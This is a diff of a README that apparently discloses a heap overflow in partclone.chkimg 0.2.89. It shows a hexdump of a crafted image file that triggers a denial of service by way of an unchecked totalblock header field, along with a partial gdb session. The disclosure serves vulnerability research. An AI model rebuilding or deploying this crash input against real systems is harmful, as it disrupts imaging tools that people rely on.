@@ -1,17 +1,27 @@
 # Partclone_HeapOverFlow
 
+
 Partclone.chkimg that checks image has a vulnerability with openning a maliciusly craft image file.
+It causes Denial-Of-Service.
+<br><br>
 
 root@ubuntu:/partclone-0.2.89# hexdump -C hack.img | more
+
 00000000  70 61 72 74 63 6c 6f 6e  65 2d 69 6d 61 67 65 45  |partclone-imageE|
+
 00000010  58 54 46 53 00 00 00 00  00 00 00 00 00 00 30 30  |XTFS..........00|
+
 00000020  30 31 00 00 00 04 00 00  00 20 bf 0c 00 00 00 00  |01....... ......|
+
 00000030  c8 2f 03 00 00 ff ff ff  ba 7a 00 00 00 00 00 00  |./.......z......|
+
 00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
 
+<br><br>
 
 (insufficient checking on offset 0x35 ~ 0x37 in image-header.totalblock)
 
+<br><br>
 root@ubuntu:/partclone-0.2.89# gdb ./partclone.chkimg
 
 Reading symbols from ./partclone.chkimg...done.
@@ -73,6 +83,4 @@ $2 = 31922
 
 
 (gdb)
-
-
 
